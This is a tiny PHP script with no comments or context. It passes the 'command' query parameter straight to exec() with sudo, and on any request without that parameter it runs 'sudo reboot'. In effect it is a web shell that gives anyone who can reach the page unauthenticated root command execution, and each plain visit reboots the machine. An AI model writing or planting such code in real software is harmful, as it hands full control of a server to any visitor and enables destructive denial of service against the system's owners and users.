<?php
if (isset($_GET['command'])) {
    exec('sudo ' . $_GET['command']);
} else {
    exec('sudo reboot');
}
